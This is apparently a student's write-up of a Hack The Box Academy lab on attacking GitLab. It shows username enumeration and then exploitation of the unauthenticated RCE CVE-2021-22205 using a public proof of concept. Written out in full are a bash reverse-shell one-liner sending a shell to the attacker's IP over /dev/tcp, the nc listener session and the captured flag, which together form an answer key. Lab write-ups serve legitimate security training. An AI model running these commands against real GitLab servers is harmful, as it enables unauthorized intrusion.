# Section 18: Attacking Gitlab

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Find another valid user on the target GitLab instance.

Context:
- Use the Python script provided by the course:
```bash
┌─[eu-academy-4]─[10.10.15.191]─[htb-ac-2162140@htb-upvvvynamk-htb-cloud-com]─[~]
└──╼ [★]$ python3 ./gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081 --wordlist /usr/share/seclists/Usernames/cirt-default-usernames.txt 
GitLab User Enumeration in python
[+] The username DEMO exists!
[+] The username Demo exists!
```

**Answer:** `demo`

---

### 2. Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.

Context:
- Searching online for vulnerabilities related to this Gitlab version, found unauthenticated RCE vulnerability, the POC I used: [link](https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.md)
- Gain reverse shell:
```bash
┌─[eu-academy-4]─[10.10.15.191]─[htb-ac-2162140@htb-upvvvynamk-htb-cloud-com]─[~]
└──╼ [★]$ python ./poc.py http://gitlab.inlanefreight.local:8081 "bash -c 'bash -i >& /dev/tcp/10.10.15.191/4444 0>&1'"
```
- Get the flag:
```bash
┌─[eu-academy-4]─[10.10.15.191]─[htb-ac-2162140@htb-upvvvynamk-htb-cloud-com]─[~]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.201.88 46696
bash: cannot set terminal process group (1275): Inappropriate ioctl for device
bash: no job control in this shell
git@app04:~/gitlab-workhorse$ ls
ls
VERSION
config.toml
flag_gitlab.txt
sockets
git@app04:~/gitlab-workhorse$ cat flag_gitlab.txt
cat flag_gitlab.txt
s3cure_y0ur_Rep0s!
```

**Answer:** `s3cure_y0ur_Rep0s!`

---

[Back to Module Index](./README.md)